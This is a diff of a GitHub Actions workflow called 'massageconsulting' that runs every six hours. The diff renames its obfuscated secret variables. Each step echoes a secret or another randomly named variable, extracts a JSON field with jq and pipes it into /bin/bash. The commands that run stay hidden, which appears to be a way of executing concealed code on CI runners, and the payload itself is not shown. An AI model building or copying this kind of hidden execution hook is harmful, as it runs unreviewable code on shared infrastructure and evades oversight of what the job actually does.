@@ -3,24 +3,22 @@ name: massageconsulting
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 0/6 * * *'
+    - cron: '1 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: massageconsulting
         env:
-          ynvpg5: ${{ secrets.ynvpg5 }}
+          r36: ${{ secrets.r36 }}
         run: |
-          echo $ynvpg5 | jq -r .tfdi9124 | /bin/bash
-          echo $lrp0686 | jq -r .agcj293 | /bin/bash
-          echo $lbfy4885 | jq -r .xktl5 | /bin/bash
-          echo $opv07 | jq -r .m8658 | /bin/bash
-          echo $mkltg40 | jq -r .qk485 | /bin/bash
-          echo $tlol509 | jq -r .f97455 | /bin/bash
-          echo $hqud3101 | jq -r .c0 | /bin/bash
-          echo $kvlmq9652 | jq -r .fc579 | /bin/bash
-          echo $uv00151 | jq -r .yey1017 | /bin/bash
+          echo $r36 | jq -r .i55179 | /bin/bash
+          echo $etkm9822 | jq -r .npam055 | /bin/bash
+          echo $eqldk68 | jq -r .urlz185 | /bin/bash
+          echo $ba3 | jq -r .mcq7 | /bin/bash
+          echo $rwjwy183 | jq -r .je977 | /bin/bash
+          echo $huwe6 | jq -r .kln64242 | /bin/bash
 
